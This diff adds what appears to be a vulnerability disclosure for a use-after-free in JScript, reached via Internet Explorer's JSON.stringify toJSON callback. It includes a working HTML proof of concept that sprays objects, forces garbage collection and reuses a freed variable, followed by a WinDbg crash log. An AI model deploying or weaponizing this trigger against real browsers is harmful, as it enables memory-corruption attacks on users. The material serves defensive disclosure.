@@ -1,0 +1,108 @@
+There is a use-after-free issue in JSCript (triggerable via Internet Explorer) where the members of the 'arguments' object aren't tracked by the garbage collector during the 'toJSON' callback. Thus, during the 'toJSON' callback, it is possible to assign a variable to the 'arguments' object, have it garbage-collected (as long as it is not referenced anywhere else) and still access it later. Note that, like in some previously reported JSCript issues, this is a use-after-free on a JSCript variable (VAR structure), so in order to trigger a crash, the entire block of variables must be freed.
+
+PoC for Internet Explorer is below. I tested it on multiple Windows version with the latest security patches applied.
+
+===========================================================
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+    var spray = new Array();
+
+    function F() {
+        alert('callback');
+
+        // 2. Create a bunch of objects
+        for (var i = 0; i < 20000; i++) spray[i] = new Object();
+
+        // 3. Store a reference to one of them in the arguments array
+        //    The arguments array isn't tracked by garbage collector
+        arguments[0] = spray[5000];
+
+        // 4. Delete the objects and call the garbage collector
+        //    All JSCript variables get reclaimed... 
+        for (var i = 0; i < 20000; i++) spray[i] = 1;
+        CollectGarbage();
+
+        // 5. But we still have reference to one of them in the
+        //    arguments array
+        alert(arguments[0]);
+    }
+
+    // 1. Cause toJSON callback to fire
+    var o = {toJSON:F}
+    JSON.stringify(o);
+
+    alert('done');
+
+</script>
+
+===========================================================
+
+
+Debug log:
+
+===========================================================
+
+(1cf4.154): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000080 ebx=05ecc218 ecx=00000080 edx=00000001 esi=05f0c3c8 edi=05fb12e8
+eip=6e25f52a esp=05ecc180 ebp=05ecc1b4 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+jscript!PrepareInvoke+0x12a:
+6e25f52a 0fb707          movzx   eax,word ptr [edi]       ds:002b:05fb12e8=????
+
+0:009> k
+ # ChildEBP RetAddr  
+00 05ecc1b4 6e262b75 jscript!PrepareInvoke+0x12a
+01 05ecc2a8 6e2660ee jscript!VAR::InvokeByDispID+0x1c5
+02 05ecc4a0 6e26244a jscript!CScriptRuntime::Run+0x2e4e
+03 05ecc594 6e2622a1 jscript!ScrFncObj::CallWithFrameOnStack+0xaa
+04 05ecc5ec 6e25bec9 jscript!ScrFncObj::Call+0x81
+05 05ecc68c 6e262aed jscript!NameTbl::InvokeInternal+0x399
+06 05ecc78c 6e2a862c jscript!VAR::InvokeByDispID+0x13d
+07 05ecc800 6e2a8c2e jscript!GCProtectKeyAndCall+0xed
+08 05ecc898 6e2a93ce jscript!JSONApplyFilters+0x125
+09 05ecc90c 6e2ad9a2 jscript!JSONStringifyObject+0xac
+0a 05ecc9b4 6e269e3a jscript!JsJSONStringify+0x382
+0b 05ecca1c 6e25bec9 jscript!NatFncObj::Call+0xea
+0c 05eccabc 6e25e476 jscript!NameTbl::InvokeInternal+0x399
+0d 05eccc78 6e262aa5 jscript!VAR::InvokeByName+0x8f6
+0e 05eccd70 6e2660ee jscript!VAR::InvokeByDispID+0xf5
+0f 05eccf68 6e26244a jscript!CScriptRuntime::Run+0x2e4e
+10 05ecd05c 6e2622a1 jscript!ScrFncObj::CallWithFrameOnStack+0xaa
+11 05ecd0b4 6e257124 jscript!ScrFncObj::Call+0x81
+12 05ecd170 6e257f75 jscript!CSession::Execute+0x314
+13 05ecd1d0 6e256c83 jscript!COleScript::ExecutePendingScripts+0x2d5
+14 05ecd274 6e2569b9 jscript!COleScript::ParseScriptTextCore+0x2c3
+15 05ecd2a0 70209251 jscript!COleScript::ParseScriptText+0x29
+16 05ecd2d8 70122a27 MSHTML!CActiveScriptHolder::ParseScriptText+0x51
+17 05ecd348 70121fe2 MSHTML!CScriptCollection::ParseScriptText+0x182
+18 05ecd434 701226ee MSHTML!CScriptData::CommitCode+0x312
+19 05ecd4b0 7012153a MSHTML!CScriptData::Execute+0x1ba
+1a 05ecd4d0 701e99b6 MSHTML!CHtmScriptParseCtx::Execute+0xaa
+1b 05ecd524 70159c7d MSHTML!CHtmParseBase::Execute+0x186
+1c 05ecd544 70159599 MSHTML!CHtmPost::Broadcast+0xfd
+1d 05ecd66c 7017647d MSHTML!CHtmPost::Exec+0x339
+1e 05ecd68c 70176376 MSHTML!CHtmPost::Run+0x3d
+1f 05ecd6ac 70176308 MSHTML!PostManExecute+0x60
+20 05ecd6c0 70176279 MSHTML!PostManResume+0x6f
+21 05ecd6f0 70208447 MSHTML!CHtmPost::OnDwnChanCallback+0x39
+22 05ecd708 7015be1d MSHTML!CDwnChan::OnMethodCall+0x27
+23 05ecd780 702f1207 MSHTML!GlobalWndOnMethodCall+0x1bd
+24 05ecd7d0 7015c5a2 MSHTML!GlobalWndProc_SEH+0x317
+25 05ecd7ec 7562624b MSHTML!GlobalWndProc+0x52
+26 05ecd818 756174dc USER32!_InternalCallWinProc+0x2b
+27 05ecd8fc 7561661b USER32!UserCallWinProcCheckWow+0x3ac
+28 05ecd970 756163f0 USER32!DispatchMessageWorker+0x21b
+29 05ecd97c 717e6456 USER32!DispatchMessageW+0x10
+2a 05ecfb0c 717e73e3 IEFRAME!CTabWindow::_TabWindowThreadProc+0xa36
+2b 05ecfbcc 7223df6c IEFRAME!LCIETab_ThreadProc+0x403
+2c 05ecfbe4 7130289d msIso!_IsoThreadProc_WrapperToReleaseScope+0x1c
+2d 05ecfc1c 75520419 IEShims!NS_CreateThread::AutomationIE_ThreadProc+0x8d
+2e 05ecfc2c 7789662d KERNEL32!BaseThreadInitThunk+0x19
+2f 05ecfc88 778965fd ntdll!__RtlUserThreadStart+0x2f
+30 05ecfc98 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+===========================================================
